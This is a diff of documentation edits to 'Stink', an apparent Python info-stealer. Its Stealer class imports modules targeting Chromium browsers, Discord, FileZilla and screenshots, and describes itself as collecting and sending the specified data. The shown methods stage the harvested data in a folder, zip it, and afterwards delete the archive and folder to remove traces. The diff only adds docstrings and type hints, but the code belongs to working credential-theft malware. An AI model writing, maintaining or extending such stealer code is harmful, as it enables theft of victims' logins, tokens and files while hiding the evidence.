@@ -12,6 +12,9 @@ from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, S
 
 
 class Stealer(Thread):
+    """
+    Collects and sends the specified data.
+    """
 
     def __init__(self, senders: list = [], features: list = [Features.all], utils: list = []):
         Thread.__init__(self, name="Stealer")
@@ -154,24 +157,36 @@ class Stealer(Thread):
         ]
 
     def __create_storage(self) -> None:
-
+        """
+        Creates storage for the Stink.
+        :return: None
+        """
         if not path.exists(self.__config.StoragePath):
             makedirs(self.__config.StoragePath)
         else:
             rmtree(self.__config.StoragePath)
             makedirs(self.__config.StoragePath)
 
-    def __create_archive(self):
-
+    def __create_archive(self) -> None:
+        """
+        Creates a data archive.
+        :return: None
+        """
         make_archive(rf"{path.dirname(self.__config.StoragePath)}\{self.__config.ZipName}", "zip", self.__config.StoragePath)
 
-    def __delete_files(self):
-
+    def __delete_files(self) -> None:
+        """
+        Deletes the archive and storage.
+        :return: None
+        """
         rmtree(self.__config.StoragePath)
         remove(rf"{path.dirname(self.__config.StoragePath)}\{self.__config.ZipName}.zip")
 
     def run(self) -> None:
-
+        """
+        Launches the Stink.
+        :return: None
+        """
         try:
 
             self.__create_storage()
